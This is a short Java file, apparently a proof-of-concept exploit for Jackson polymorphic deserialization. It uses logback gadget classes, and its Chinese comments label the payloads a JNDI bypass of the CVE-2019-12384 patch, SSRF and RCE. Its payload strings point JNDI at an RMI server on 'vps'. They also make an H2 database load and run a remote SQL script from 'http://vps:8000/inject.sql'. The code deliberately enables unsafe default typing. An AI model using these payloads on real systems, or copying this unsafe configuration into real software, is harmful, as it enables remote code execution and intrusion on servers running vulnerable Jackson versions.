import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import java.io.IOException;

public class Target {

	public static void main(String[] args) throws IOException {
		String payload = "";

		// jndi绕过 CVE-2019-12384 补丁
		payload = "[\"ch.qos.logback.core.db.JNDIConnectionSource\", {\"jndiLocation\":\"rmi://vps:1099/TouchFile\"}]";
		// ssrf
		payload = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://localhost:2333/~/test\"}]";
		// rce
		payload = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://vps:8000/inject.sql'\"}]";
		ObjectMapper mapper = new ObjectMapper();

		mapper.enableDefaultTyping();

		mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);

		Object object = mapper.readValue(payload, java.lang.Object.class);

		System.out.println(mapper.writeValueAsString(object));
	}
}